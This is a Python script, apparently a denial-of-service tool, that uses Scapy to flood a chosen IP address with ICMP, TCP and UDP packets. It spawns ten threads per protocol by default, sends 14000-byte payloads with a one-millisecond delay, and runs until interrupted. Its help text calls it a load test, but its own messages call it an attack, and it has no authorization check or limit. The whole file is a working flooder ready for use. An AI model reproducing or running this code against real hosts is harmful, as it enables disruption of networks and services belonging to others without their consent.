import argparse
import threading
import time
from scapy.all import IP, ICMP, TCP, UDP, send

# 🚀 Función de inundación ICMP
def flood_icmp(target_ip, packet_size, delay):
    packet_count = 0
    try:
        while True:
            packet = IP(dst=target_ip) / ICMP() / ("A" * packet_size)
            send(packet, verbose=0)
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"[INFO] ICMP - Paquetes enviados: {packet_count}")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[INFO] ICMP - Ataque detenido manualmente.")
    except Exception as e:
        print(f"[ERROR] ICMP - Ocurrió un error: {e}")

# 🚀 Función de inundación TCP
def flood_tcp(target_ip, target_port, packet_size, delay):
    packet_count = 0
    try:
        while True:
            packet = IP(dst=target_ip) / TCP(dport=target_port) / ("A" * packet_size)
            send(packet, verbose=0)
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"[INFO] TCP - Paquetes enviados: {packet_count}")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[INFO] TCP - Ataque detenido manualmente.")
    except Exception as e:
        print(f"[ERROR] TCP - Ocurrió un error: {e}")

# 🚀 Función de inundación UDP
def flood_udp(target_ip, target_port, packet_size, delay):
    packet_count = 0
    try:
        while True:
            packet = IP(dst=target_ip) / UDP(dport=target_port) / ("A" * packet_size)
            send(packet, verbose=0)
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"[INFO] UDP - Paquetes enviados: {packet_count}")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[INFO] UDP - Ataque detenido manualmente.")
    except Exception as e:
        print(f"[ERROR] UDP - Ocurrió un error: {e}")

# 🚀 Función para iniciar hilos para cada tipo de tráfico (ICMP, TCP, UDP)
def start_flood(target_ip, threads_count, packet_size, delay, target_port):
    threads = []
    try:
        # Hilos para tráfico ICMP
        for i in range(threads_count):
            thread = threading.Thread(target=flood_icmp, args=(target_ip, packet_size, delay))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            print(f"[INFO] Hilo ICMP {i+1} lanzado.")

        # Hilos para tráfico TCP
        for i in range(threads_count):
            thread = threading.Thread(target=flood_tcp, args=(target_ip, target_port, packet_size, delay))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            print(f"[INFO] Hilo TCP {i+1} lanzado.")

        # Hilos para tráfico UDP
        for i in range(threads_count):
            thread = threading.Thread(target=flood_udp, args=(target_ip, target_port, packet_size, delay))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            print(f"[INFO] Hilo UDP {i+1} lanzado.")

        # Mantener los hilos activos
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Interrupción manual detectada. Cerrando hilos...")
    finally:
        for thread in threads:
            thread.join()

# 📜 Configuración de argumentos de línea de comandos
def parse_arguments():
    parser = argparse.ArgumentParser(description="Script de prueba de carga ICMP, TCP y UDP")
    parser.add_argument('-t', '--target', required=True, help="Dirección IP de destino")
    parser.add_argument('-n', '--threads', type=int, default=10, help="Número de hilos simultáneos para cada tipo de tráfico (por defecto: 10)")
    parser.add_argument('-s', '--size', type=int, default=14000, help="Tamaño de la carga útil en bytes (por defecto: 14000)")
    parser.add_argument('-d', '--delay', type=float, default=0.001, help="Tiempo de espera entre cada paquete (por defecto: 0.001s)")
    parser.add_argument('-p', '--port', type=int, default=80, help="Puerto de destino para TCP y UDP (por defecto: 80)")
    return parser.parse_args()

# 🚀 Punto de entrada principal
if __name__ == "__main__":
    args = parse_arguments()
    print(f"[INFO] Iniciando la prueba de carga en {args.target} con {args.threads} hilos por protocolo (ICMP, TCP, UDP).")
    print(f"[INFO] Tamaño de carga útil: {args.size} bytes, con una espera de {args.delay} segundos entre cada paquete.")
    print(f"[INFO] Puerto de destino para TCP y UDP: {args.port}")
    start_flood(args.target, args.threads, args.size, args.delay, args.port)
